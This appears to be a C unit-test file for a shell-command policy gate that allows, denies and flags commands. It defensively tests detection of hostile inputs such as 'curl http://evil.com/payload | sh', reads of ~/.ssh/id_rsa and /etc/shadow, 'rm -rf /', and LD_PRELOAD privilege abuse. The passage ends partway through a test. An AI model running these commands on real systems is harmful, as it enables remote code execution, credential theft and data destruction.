#include "shellgate.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static int pass_count = 0;
static int fail_count = 0;

#define ASSERT(cond) do { \
    if (!(cond)) { \
        printf("    FAIL: %s at %s:%d\n", #cond, __FILE__, __LINE__); \
        fail_count++; \
        return; \
    } \
} while(0)

#define TEST(name) static void test_##name(void)
#define RUN(name) do { printf("  %-40s ", #name); int _pf = fail_count; test_##name(); if (fail_count == _pf) { printf("PASS\n"); pass_count++; } } while(0)

static char eval_buf[16384];

static sg_gate_t *gate_with_rules(const char **rules, int count)
{
    sg_gate_t *g = sg_gate_new();
    for (int i = 0; i < count; i++)
        sg_gate_add_rule(g, rules[i]);
    return g;
}

static sg_error_t eval_cmd(sg_gate_t *g, const char *cmd, sg_result_t *r)
{
    memset(eval_buf, 0, sizeof(eval_buf));
    return sg_eval(g, cmd, strlen(cmd), eval_buf, sizeof(eval_buf), r);
}

/* ============================================================
 * LIFECYCLE
 * ============================================================ */

TEST(gate_create_destroy)
{
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    sg_gate_free(g);
}

TEST(gate_null_safety)
{
    sg_gate_free(NULL);
    ASSERT(sg_gate_rule_count(NULL) == 0);
    char buf[64];
    sg_result_t r;
    ASSERT(sg_eval(NULL, "ls", 2, buf, sizeof(buf), NULL) == SG_ERR_INVALID);
    ASSERT(sg_eval(NULL, "ls", 2, buf, sizeof(buf), &r) == SG_ERR_INVALID);
}

/* ============================================================
 * SIMPLE ALLOW / DENY
 * ============================================================ */

TEST(allow_simple_command)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    sg_error_t err = eval_cmd(g, "ls", &r);
    ASSERT(err == SG_OK);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmd_count == 1);
    ASSERT(r.subcmds[0].matches);
    ASSERT(r.subcmds[0].command != NULL);
    ASSERT(strcmp(r.subcmds[0].command, "ls") == 0);
    sg_gate_free(g);
}

TEST(deny_unknown_command)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    sg_error_t err = eval_cmd(g, "rm -rf /", &r);
    ASSERT(err == SG_OK);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(r.subcmds[0].command != NULL);
    sg_gate_free(g);
}

TEST(allow_with_args)
{
    const char *rules[] = { "ls * *" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    eval_cmd(g, "ls -la /home", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    sg_gate_free(g);
}

TEST(deny_empty_policy)
{
    sg_gate_t *g = sg_gate_new();
    sg_result_t r;
    eval_cmd(g, "ls", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(g);
}

/* ============================================================
 * PIPES
 * ============================================================ */

TEST(allow_pipe_both_match)
{
    const char *rules[] = { "ls", "sort" };
    sg_gate_t *g = gate_with_rules(rules, 2);
    sg_result_t r;
    eval_cmd(g, "ls | sort", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmd_count == 2);
    ASSERT(strcmp(r.subcmds[0].command, "ls") == 0);
    ASSERT(strcmp(r.subcmds[1].command, "sort") == 0);
    sg_gate_free(g);
}

TEST(deny_pipe_one_fails)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    eval_cmd(g, "ls | rm", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(r.subcmd_count >= 1);
    sg_gate_free(g);
}

/* ============================================================
 * OPERATORS
 * ============================================================ */

TEST(allow_semicolon_both_match)
{
    const char *rules[] = { "ls", "pwd" };
    sg_gate_t *g = gate_with_rules(rules, 2);
    sg_result_t r;
    eval_cmd(g, "ls ; pwd", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    sg_gate_free(g);
}

TEST(deny_and_first_fails)
{
    const char *rules[] = { "rm" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    eval_cmd(g, "rm -rf / && ls", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(g);
}

TEST(deny_or_first_fails)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    eval_cmd(g, "rm || ls", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(g);
}

/* ============================================================
 * WILDCARD PATTERNS
 * ============================================================ */

TEST(allow_wildcard_args)
{
    const char *rules[] = { "git * * *" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    eval_cmd(g, "git commit -m hello", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    sg_gate_free(g);
}

TEST(allow_path_wildcard)
{
    const char *rules[] = { "cat #path" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_result_t r;
    eval_cmd(g, "cat /etc/passwd", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    sg_gate_free(g);
}

/* ============================================================
 * FEATURE REJECTION
 * ============================================================ */

TEST(reject_subshell)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "echo *");
    sg_result_t r;
    eval_cmd(g, "echo $(whoami)", &r);
    ASSERT(r.verdict == SG_VERDICT_REJECT);
    ASSERT(r.deny_reason != NULL);
    ASSERT(strstr(r.deny_reason, "command substitution") != NULL);
    sg_gate_free(g);
}

TEST(reject_heredoc)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "cat");
    sg_result_t r;
    eval_cmd(g, "cat <<EOF\nhello\nEOF", &r);
    ASSERT(r.verdict == SG_VERDICT_REJECT);
    sg_gate_free(g);
}

/* ============================================================
 * SUGGESTIONS
 * ============================================================ */

TEST(suggestions_on_deny)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "git status");
    sg_gate_add_rule(g, "git log");
    sg_result_t r;
    eval_cmd(g, "git commit", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(g);
}

TEST(suggestions_populated)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "cat #path");
    sg_gate_add_rule(g, "ls");
    sg_result_t r;
    eval_cmd(g, "cat", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    if (r.suggestion_count > 0) {
        ASSERT(r.suggestions[0] != NULL);
        ASSERT(r.suggestions[0][0] != '\0');
        ASSERT(strstr(r.suggestions[0], "cat") != NULL);
    }
    sg_gate_free(g);
}

TEST(suggestions_two_offered)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "cat #path");
    sg_gate_add_rule(g, "cat #path #path");
    sg_result_t r;
    eval_cmd(g, "cat", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    if (r.suggestion_count >= 2) {
        ASSERT(r.suggestions[0] != NULL);
        ASSERT(r.suggestions[1] != NULL);
        ASSERT(r.suggestions[0] != r.suggestions[1]);
    }
    sg_gate_free(g);
}

TEST(suggestions_disabled)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_gate_set_suggestions(g, false);
    sg_result_t r;
    eval_cmd(g, "rm", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(r.suggestion_count == 0);
    sg_gate_free(g);
}

/* ============================================================
 * EDGE CASES
 * ============================================================ */

TEST(eval_empty_command)
{
    sg_gate_t *g = sg_gate_new();
    sg_result_t r;
    sg_error_t err = eval_cmd(g, "", &r);
    ASSERT(err == SG_ERR_INVALID);
    sg_gate_free(g);
}

TEST(eval_whitespace_command)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls");
    sg_result_t r;
    eval_cmd(g, "   ", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    sg_gate_free(g);
}

TEST(eval_parse_error)
{
    sg_gate_t *g = sg_gate_new();
    sg_result_t r;
    eval_cmd(g, "echo \"unclosed", &r);
    ASSERT(r.verdict == SG_VERDICT_REJECT);
    sg_gate_free(g);
}

/* ============================================================
 * CONFIGURATION
 * ============================================================ */

TEST(config_cwd)
{
    sg_gate_t *g = sg_gate_new();
    sg_error_t err = sg_gate_set_cwd(g, "/tmp");
    ASSERT(err == SG_OK);
    sg_gate_free(g);
}

TEST(config_stop_first_fail)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_gate_set_stop_mode(g, SG_STOP_FIRST_FAIL);
    sg_result_t r;
    eval_cmd(g, "rm ; ls", &r);
    ASSERT(r.subcmd_count == 1);
    ASSERT(!r.subcmds[0].matches);
    sg_gate_free(g);
}

TEST(config_eval_all)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_gate_set_stop_mode(g, SG_EVAL_ALL);
    sg_result_t r;
    eval_cmd(g, "rm ; ls", &r);
    ASSERT(r.subcmd_count == 2);
    ASSERT(!r.subcmds[0].matches);
    ASSERT(r.subcmds[1].matches);
    sg_gate_free(g);
}

TEST(config_stop_first_pass)
{
    const char *rules[] = { "cat #path" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    sg_gate_set_stop_mode(g, SG_STOP_FIRST_PASS);
    sg_result_t r;
    eval_cmd(g, "rm ; cat /etc/passwd", &r);
    ASSERT(r.subcmd_count == 2);
    ASSERT(!r.subcmds[0].matches);
    ASSERT(r.subcmds[1].matches);
    sg_gate_free(g);
}

TEST(config_stop_first_allow)
{
    const char *rules[] = { "ls", "cat" };
    sg_gate_t *g = gate_with_rules(rules, 2);
    sg_gate_set_stop_mode(g, SG_STOP_FIRST_ALLOW);
    sg_result_t r;
    eval_cmd(g, "ls ; cat /tmp", &r);
    ASSERT(r.subcmd_count == 1);
    ASSERT(r.subcmds[0].matches);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    sg_gate_free(g);
}

TEST(config_stop_first_deny)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls");
    sg_gate_add_rule(g, "cat #path");
    sg_gate_add_deny_rule(g, "cat /etc/shadow");
    sg_gate_set_stop_mode(g, SG_STOP_FIRST_DENY);
    sg_result_t r;
    eval_cmd(g, "ls ; cat /etc/shadow", &r);
    ASSERT(r.subcmd_count == 2);
    ASSERT(r.subcmds[0].matches);
    ASSERT(r.subcmds[1].matches);
    ASSERT(r.verdict == SG_VERDICT_DENY);
    sg_gate_free(g);
}

/* ============================================================
 * POLICY MANAGEMENT
 * ============================================================ */

TEST(add_remove_rule)
{
    sg_gate_t *g = sg_gate_new();
    ASSERT(sg_gate_rule_count(g) == 0);
    sg_gate_add_rule(g, "ls");
    ASSERT(sg_gate_rule_count(g) == 1);
    sg_gate_remove_rule(g, "ls");
    ASSERT(sg_gate_rule_count(g) == 0);
    sg_gate_free(g);
}

TEST(remove_nonexistent)
{
    sg_gate_t *g = sg_gate_new();
    sg_error_t err = sg_gate_remove_rule(g, "nope");
    ASSERT(err == SG_OK);
    sg_gate_free(g);
}

TEST(deny_rule_add_remove)
{
    sg_gate_t *g = sg_gate_new();
    ASSERT(sg_gate_deny_rule_count(g) == 0);
    sg_gate_add_deny_rule(g, "rm");
    ASSERT(sg_gate_deny_rule_count(g) == 1);
    sg_gate_add_deny_rule(g, "dd");
    ASSERT(sg_gate_deny_rule_count(g) == 2);
    sg_gate_remove_deny_rule(g, "rm");
    ASSERT(sg_gate_deny_rule_count(g) == 1);
    sg_gate_remove_deny_rule(g, "dd");
    ASSERT(sg_gate_deny_rule_count(g) == 0);
    sg_gate_free(g);
}

TEST(deny_rule_overrides_allow)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_deny_rule(g, "cat /etc/shadow");
    sg_gate_add_rule(g, "cat #path");
    sg_result_t r;
    eval_cmd(g, "cat /etc/shadow", &r);
    ASSERT(r.verdict == SG_VERDICT_DENY);
    sg_gate_free(g);
}

TEST(deny_rule_save_load)
{
    const char *path = "/tmp/shellgate_test_deny.txt";
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "cat #path");
    sg_gate_add_deny_rule(g, "cat /etc/shadow");

    sg_error_t err = sg_gate_save_policy(g, path);
    ASSERT(err == SG_OK);

    sg_gate_t *g2 = sg_gate_new();
    err = sg_gate_load_policy(g2, path);
    ASSERT(err == SG_OK);
    ASSERT(sg_gate_rule_count(g2) == 1);

    unlink(path);
    sg_gate_free(g);
    sg_gate_free(g2);
}

/* ============================================================
 * SERIALIZATION
 * ============================================================ */

TEST(save_load_roundtrip)
{
    const char *path = "/tmp/shellgate_test_save.txt";
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls");
    sg_gate_add_rule(g, "cat #path");
    sg_gate_add_rule(g, "git * * *");
    ASSERT(sg_gate_rule_count(g) == 3);

    sg_error_t err = sg_gate_save_policy(g, path);
    ASSERT(err == SG_OK);

    sg_gate_t *g2 = sg_gate_new();
    err = sg_gate_load_policy(g2, path);
    ASSERT(err == SG_OK);
    ASSERT(sg_gate_rule_count(g2) == 3);

    sg_result_t r;
    eval_cmd(g2, "ls", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);

    eval_cmd(g2, "cat /etc/hosts", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);

    eval_cmd(g2, "rm -rf /", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);

    unlink(path);
    sg_gate_free(g);
    sg_gate_free(g2);
}

TEST(save_load_empty)
{
    const char *path = "/tmp/shellgate_test_empty.txt";
    sg_gate_t *g = sg_gate_new();
    ASSERT(sg_gate_rule_count(g) == 0);

    sg_error_t err = sg_gate_save_policy(g, path);
    ASSERT(err == SG_OK);

    sg_gate_t *g2 = sg_gate_new();
    err = sg_gate_load_policy(g2, path);
    ASSERT(err == SG_OK);
    ASSERT(sg_gate_rule_count(g2) == 0);

    sg_result_t r;
    eval_cmd(g2, "ls", &r);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);

    unlink(path);
    sg_gate_free(g);
    sg_gate_free(g2);
}

TEST(save_load_malformed)
{
    const char *path = "/tmp/shellgate_test_malformed.txt";
    FILE *f = fopen(path, "w");
    ASSERT(f != NULL);
    fprintf(f, "NOT A VALID SHELLGATE POLICY FILE\n");
    fprintf(f, "This is just garbage text that should fail to load\n");
    fclose(f);

    sg_gate_t *g = sg_gate_new();
    sg_error_t err = sg_gate_load_policy(g, path);
    ASSERT(err != SG_OK);

    unlink(path);
    sg_gate_free(g);
}

/* ============================================================
 * BUFFER MANAGEMENT
 * ============================================================ */

TEST(buffer_overflow_protection)
{
    const char *rules[] = { "ls", "sort", "cat", "grep", "awk" };
    sg_gate_t *g = gate_with_rules(rules, 5);
    char tiny[4];
    sg_result_t r;
    sg_error_t err = sg_eval(g, "ls | sort | cat", 15, tiny, sizeof(tiny), &r);
    ASSERT(err == SG_ERR_TRUNC);
    ASSERT(r.truncated == true);
    sg_gate_free(g);
}

TEST(buffer_reuse)
{
    const char *rules[] = { "ls" };
    sg_gate_t *g = gate_with_rules(rules, 1);
    char buf[256];

    memset(buf, 0, sizeof(buf));
    sg_result_t r1;
    sg_error_t err = sg_eval(g, "ls", 2, buf, sizeof(buf), &r1);
    ASSERT(err == SG_OK);
    ASSERT(r1.verdict == SG_VERDICT_ALLOW);
    ASSERT(r1.subcmds[0].command != NULL);

    memset(buf, 0, sizeof(buf));
    sg_result_t r2;
    err = sg_eval(g, "rm", 2, buf, sizeof(buf), &r2);
    ASSERT(err == SG_OK);
    ASSERT(r2.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(r2.subcmds[0].command != NULL);

    sg_gate_free(g);
}

TEST(buffer_zero_length)
{
    sg_gate_t *g = sg_gate_new();
    char buf[1];
    sg_result_t r;
    sg_error_t err = sg_eval(g, "ls", 2, buf, 0, &r);
    ASSERT(err == SG_ERR_INVALID);
    sg_gate_free(g);
}

/* ============================================================
 * VERDICT HELPERS
 * ============================================================ */

TEST(verdict_names)
{
    ASSERT(strcmp(sg_verdict_name(SG_VERDICT_ALLOW), "ALLOW") == 0);
    ASSERT(strcmp(sg_verdict_name(SG_VERDICT_DENY), "DENY") == 0);
    ASSERT(strcmp(sg_verdict_name(SG_VERDICT_REJECT), "REJECT") == 0);
    ASSERT(strcmp(sg_verdict_name(SG_VERDICT_UNDETERMINED), "UNDETERMINED") == 0);
}

TEST(eval_size_hint)
{
    size_t hint0 = sg_eval_size_hint(0);
    ASSERT(hint0 > 0);

    size_t hint10 = sg_eval_size_hint(10);
    ASSERT(hint10 > hint0);

    size_t hint100 = sg_eval_size_hint(100);
    ASSERT(hint100 > hint10);
}

TEST(violation_dropped_count)
{
    sg_gate_t *g = sg_gate_new();
    const char *rules[] = { "cat #path" };
    for (int i = 0; i < 1; i++)
        sg_gate_add_rule(g, rules[i]);

    char buf[256];
    sg_result_t r;
    sg_error_t err = sg_eval(g, "cat /etc/shadow", 16, buf, sizeof(buf), &r);
    ASSERT(err == SG_OK);
    ASSERT(r.violation_dropped_count == 0);

    sg_gate_free(g);
}

/* ============================================================
 * EXPANSION CALLBACKS
 * ============================================================ */

static size_t expand_home(const char *name, char *buf, size_t buf_size, void *ctx)
{
    (void)ctx;
    if (strcmp(name, "HOME") == 0) {
        const char *val = "/home/testuser";
        size_t len = strlen(val);
        if (len >= buf_size) return 0;
        memcpy(buf, val, len + 1);
        return len;
    }
    return 0;
}

static size_t expand_txt_glob(const char *pattern, char *buf, size_t buf_size, void *ctx)
{
    (void)ctx;
    if (strcmp(pattern, "*.txt") == 0) {
        const char *val = "a.txt b.txt c.txt";
        size_t len = strlen(val);
        if (len >= buf_size) return 0;
        memcpy(buf, val, len + 1);
        return len;
    }
    return 0;
}

TEST(expand_var_allows_expanded_command)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls #path");
    sg_gate_set_expand_var(g, expand_home, NULL);
    sg_result_t r;
    eval_cmd(g, "ls $HOME", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmd_count == 1);
    ASSERT(r.subcmds[0].command != NULL);
    ASSERT(strcmp(r.subcmds[0].command, "ls /home/testuser") == 0);
    sg_gate_free(g);
}

TEST(expand_var_falls_back_to_raw)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "echo $UNKNOWN");
    sg_gate_set_expand_var(g, expand_home, NULL);
    sg_result_t r;
    eval_cmd(g, "echo $UNKNOWN", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmds[0].command != NULL);
    ASSERT(strcmp(r.subcmds[0].command, "echo $UNKNOWN") == 0);
    sg_gate_free(g);
}

TEST(expand_var_braces)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls #path");
    sg_gate_set_expand_var(g, expand_home, NULL);
    sg_result_t r;
    eval_cmd(g, "ls ${HOME}", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmds[0].command != NULL);
    ASSERT(strcmp(r.subcmds[0].command, "ls /home/testuser") == 0);
    sg_gate_free(g);
}

TEST(expand_var_no_callback)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls $HOME");
    sg_result_t r;
    eval_cmd(g, "ls $HOME", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmds[0].command != NULL);
    ASSERT(strcmp(r.subcmds[0].command, "ls $HOME") == 0);
    sg_gate_free(g);
}

TEST(expand_glob_allows_expanded)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "cat * * *");
    sg_gate_set_expand_glob(g, expand_txt_glob, NULL);
    sg_result_t r;
    eval_cmd(g, "cat *.txt", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(r.subcmds[0].command != NULL);
    ASSERT(strstr(r.subcmds[0].command, "a.txt") != NULL);
    sg_gate_free(g);
}

TEST(expand_mixed_var_and_plain)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "ls #path project");
    sg_gate_set_expand_var(g, expand_home, NULL);
    sg_result_t r;
    eval_cmd(g, "ls $HOME project", &r);
    ASSERT(r.verdict == SG_VERDICT_ALLOW);
    ASSERT(strcmp(r.subcmds[0].command, "ls /home/testuser project") == 0);
    sg_gate_free(g);
}

/* ============================================================
 * VIOLATION SCANNING
 * ============================================================ */

static sg_gate_t *gate_with_violations(void)
{
    sg_gate_t *g = sg_gate_new();
    sg_violation_config_t cfg;
    sg_violation_config_default(&cfg);
    sg_gate_set_violation_config(g, &cfg);
    sg_gate_add_rule(g, "echo *");
    sg_gate_add_rule(g, "cat #path");
    sg_gate_add_rule(g, "ls");
    sg_gate_add_rule(g, "rm *");
    sg_gate_add_rule(g, "sudo *");
    sg_gate_add_rule(g, "curl *");
    sg_gate_add_rule(g, "chmod *");
    sg_gate_add_rule(g, "sh");
    sg_gate_add_rule(g, "bash");
    sg_gate_add_rule(g, "base64");
    sg_gate_add_rule(g, "openssl *");
    sg_gate_add_rule(g, "git *");
    sg_gate_add_rule(g, "scp *");
    sg_gate_add_rule(g, "rsync *");
    sg_gate_add_rule(g, "nc *");
    sg_gate_add_rule(g, "crontab");
    sg_gate_add_rule(g, "head");
    sg_gate_add_rule(g, "wget *");
    sg_gate_add_rule(g, "python *");
    return g;
}

TEST(viol_write_sensitive)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "echo hello > /etc/badfile", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_count > 0);
    ASSERT(r.violation_flags & SG_VIOL_WRITE_SENSITIVE);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_WRITE_SENSITIVE) {
            ASSERT(r.violations[i].severity > 0);
            ASSERT(r.violations[i].detail != NULL);
            ASSERT(strstr(r.violations[i].detail, "/etc") != NULL);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_write_sensitive_normal)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "echo hello > /tmp/out.txt", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_WRITE_SENSITIVE));
    sg_gate_free(g);
}

TEST(viol_remove_system)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "rm -rf /etc", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_REMOVE_SYSTEM);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_REMOVE_SYSTEM) {
            ASSERT(r.violations[i].severity >= 90);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_remove_normal)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "rm /tmp/junk", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_REMOVE_SYSTEM));
    sg_gate_free(g);
}

TEST(viol_env_privileged)
{
    sg_gate_t *g = gate_with_violations();
    sg_gate_add_rule(g, "sudo *");
    sg_result_t r;
    eval_cmd(g, "LD_PRELOAD=mal.so sudo ls", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_ENV_PRIVILEGED);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_ENV_PRIVILEGED) {
            ASSERT(r.violations[i].severity >= 80);
            ASSERT(r.violations[i].detail != NULL);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_env_normal)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "FOO=bar ls", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_ENV_PRIVILEGED));
    sg_gate_free(g);
}

TEST(viol_write_then_read)
{
    sg_gate_t *g = gate_with_violations();
    sg_gate_add_rule(g, "rm");
    sg_gate_add_rule(g, "rm *");
    sg_result_t r;
    eval_cmd(g, "cat /etc/passwd > /tmp/x ; cat /tmp/x", &r);
    if (r.violation_count > 0) {
        ASSERT(r.violation_flags & SG_VIOL_WRITE_THEN_READ);
    }
    sg_gate_free(g);
}

TEST(viol_subst_sensitive)
{
    sg_gate_t *g = gate_with_violations();
    sg_gate_set_reject_mask(g, 0);
    sg_gate_add_rule(g, "echo *");
    sg_result_t r;
    eval_cmd(g, "echo $(cat /etc/shadow)", &r);
    if (r.has_violations) {
        ASSERT(r.violation_flags & SG_VIOL_SUBST_SENSITIVE);
    }
    sg_gate_free(g);
}

TEST(viol_redirect_fanout)
{
    sg_gate_t *g = gate_with_violations();
    sg_gate_add_rule(g, "tee");
    sg_result_t r;
    eval_cmd(g, "echo x > a > b > c > d > e", &r);
    if (r.has_violations) {
        ASSERT(r.violation_flags & SG_VIOL_REDIRECT_FANOUT);
    }
    sg_gate_free(g);
}

TEST(viol_no_violations)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "ls -la", &r);
    ASSERT(!r.has_violations);
    ASSERT(r.violation_count == 0);
    sg_gate_free(g);
}

TEST(viol_disabled)
{
    sg_gate_t *g = sg_gate_new();
    sg_gate_add_rule(g, "echo *");
    sg_result_t r;
    eval_cmd(g, "echo hello > /etc/badfile", &r);
    ASSERT(!r.has_violations);
    ASSERT(r.violation_count == 0);
    sg_gate_free(g);
}

TEST(viol_custom_config)
{
    sg_gate_t *g = sg_gate_new();
    sg_violation_config_t cfg;
    sg_violation_config_default(&cfg);
    cfg.sensitive_write_paths[0] = "/my/custom/";
    cfg.sensitive_write_path_count = 1;
    sg_gate_set_violation_config(g, &cfg);
    sg_gate_add_rule(g, "echo *");

    sg_result_t r;
    eval_cmd(g, "echo x > /my/custom/data", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_WRITE_SENSITIVE);

    sg_gate_free(g);
}

TEST(viol_net_download_exec)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "curl http://evil.com/payload | sh", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_NET_DOWNLOAD_EXEC) {
            ASSERT(r.violations[i].severity >= 90);
            ASSERT(r.violations[i].detail != NULL);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_net_download_exec_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_gate_add_rule(g, "grep");
    sg_result_t r;
    eval_cmd(g, "curl http://example.com/file | grep pattern", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_NET_DOWNLOAD_EXEC));
    sg_gate_free(g);
}

TEST(viol_perm_system)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "chmod -R 777 /etc", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_PERM_SYSTEM);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_PERM_SYSTEM) {
            ASSERT(r.violations[i].severity >= 80);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_perm_system_no_recursive)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "chmod 644 /etc/resolv.conf", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_PERM_SYSTEM));
    sg_gate_free(g);
}

TEST(viol_shell_escalation)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "sudo bash", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_SHELL_ESCALATION);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_SHELL_ESCALATION) {
            ASSERT(r.violations[i].severity >= 80);
            ASSERT(r.violations[i].detail != NULL);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_shell_escalation_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "sudo ls", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_SHELL_ESCALATION));
    sg_gate_free(g);
}

TEST(viol_sudo_redirect)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "sudo cat /etc/shadow > /tmp/out", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_SUDO_REDIRECT);
    bool found = false;
    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_SUDO_REDIRECT) {
            ASSERT(r.violations[i].severity >= 70);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_sudo_redirect_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "sudo ls", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_SUDO_REDIRECT));
    sg_gate_free(g);
}

TEST(viol_read_secrets)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "cat ~/.ssh/id_rsa", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_READ_SECRETS);
    bool found = false;
